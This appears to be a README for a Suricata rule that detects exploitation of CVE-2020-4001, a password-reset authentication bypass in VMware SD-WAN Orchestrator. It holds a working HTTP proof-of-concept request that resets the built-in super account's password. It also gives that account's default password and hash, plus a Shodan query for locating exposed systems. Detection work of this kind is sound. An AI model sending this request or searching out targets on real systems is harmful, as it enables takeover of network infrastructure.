## Overview
Due to the predefined (and disabled) account "super@velocloud.net" and the easily guessed token when reset password on VMware SD-WAN Orchestrator (former VeloCloud), attackers could re-enable this account and access the system via the web interface.

CVE-2020-4001 also enable the attackers' capacity to exploit CVE-2020-3984 and CVE-2020-4000 without the credentials of a valid user.

The Suricata rule tries to detect the reset password action of the account "super@velocloud.net" with the password hash "**f90b59f737bcdbfc7267b619508d426b3531446b5869ec5133d0f109ee744246**" (SHA-256 of "**vcadm!n**", the default password). However, you should bypass the case the sysadmin changes this password himself.

### Bonus for bug bounty hunters
Search for VMware SD-WAN Orchestrator on Shodan:
**http.title:"VeloCloud"**

## Proof of Concept
```
POST /login/doResetPassword.html HTTP/1.1
Host: example.com
Content-Length: 346
Content-Type: application/json

{"username": "super@velocloud.net", "password": "testpass", "userType": "OPERATOR", "token": "{CLEAR}{\"username\": \"super@velocloud.net\", \"userType\": \"OPERATOR\", \"logicalId\": \"c9408004-2b42-11e9-a642-0ad57a9a2532\", \"expiration\": \"test\", \"hash\": \"f90b59f737bcdbfc7267b619508d426b3531446b5869ec5133d0f109ee744246\"}", "userId": 5}
```

## References
* https://medium.com/realmodelabs/sd-pwn-part-4-vmware-velocloud-the-last-takeover-a7016f9a9175
* https://github.com/RealmodeLabs/SD-PWN/blob/master/vmware_velocloud_orchestrator_rce.py
* https://www.vmware.com/security/advisories/VMSA-2020-0025.html